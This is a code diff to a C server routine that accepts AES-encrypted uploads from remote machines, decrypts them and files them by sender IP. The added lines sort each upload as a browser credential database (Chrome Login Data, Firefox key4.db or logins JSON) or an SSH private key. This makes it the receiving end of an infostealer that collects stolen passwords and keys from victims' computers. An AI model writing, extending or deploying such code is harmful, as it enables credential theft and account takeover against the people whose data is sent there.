@@ -54,27 +54,48 @@ void *handle_client(void *arg) {
     fprintf(stderr, "[DEBUG] Received %zd bytes from %s\n", received, ipstr);
 #endif
 
-    // Decrypt the data
+    // Decrypt the buffer
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
     AES_CBC_decrypt_buffer(&ctx, buffer, received);
 
-    // Create unique filename
+    // === Strip Padding ===
+    if (received > 0) {
+        uint8_t padding = buffer[received - 1];
+        if (padding > 0 && padding <= AES_BLOCKLEN && padding <= received) {
+            received -= padding;
+#ifdef DEBUG
+            fprintf(stderr, "[DEBUG] Stripped %u bytes of padding\n", padding);
+#endif
+        }
+    }
+
+    // ===  file type ===
+    const char *type = "unknown";
+    if (received >= 15 && memcmp(buffer, "SQLite format 3", 15) == 0) {
+        type = "sqlite"; // likely key4.db or Chrome Login Data
+    } else if (strstr((char*)buffer, "\"logins\"")) {
+        type = "firefox_logins_json";
+    } else if (strstr((char*)buffer, "PRIVATE KEY")) {
+        type = "ssh_private_key";
+    }
+
     time_t now = time(NULL);
     struct tm *t = localtime(&now);
 
-    char filename[256];
     pthread_mutex_lock(&id_lock);
     int id = dump_counter++;
     pthread_mutex_unlock(&id_lock);
 
+    char filename[256];
     snprintf(filename, sizeof(filename),
-             SAVE_DIR "/dump_%s_%04d%02d%02d_%02d%02d%02d_%d",
-             ipstr,
+             SAVE_DIR "/%s_%s_%04d%02d%02d_%02d%02d%02d_%d.bin",
+             type, ipstr,
              t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
              t->tm_hour, t->tm_min, t->tm_sec,
              id);
 
+    // === Save decrypted buffer ===
     FILE *fp = fopen(filename, "wb");
     if (!fp) {
         perror("[ERROR] fopen");
@@ -83,15 +104,17 @@ void *handle_client(void *arg) {
         pthread_exit(NULL);
     }
 
-    fwrite(buffer, 1, received, fp);
+    fwrite(buffer, 1, received, fp); 
     fclose(fp);
     close(info->sock);
 
-    printf("[+] Saved dump to: %s\n", filename);
+    printf("[+] Saved blob to: %s\n", filename);
 
     free(info);
     pthread_exit(NULL);
 }
+
+
 
 int main(void) {
     mkdir(SAVE_DIR, 0700);
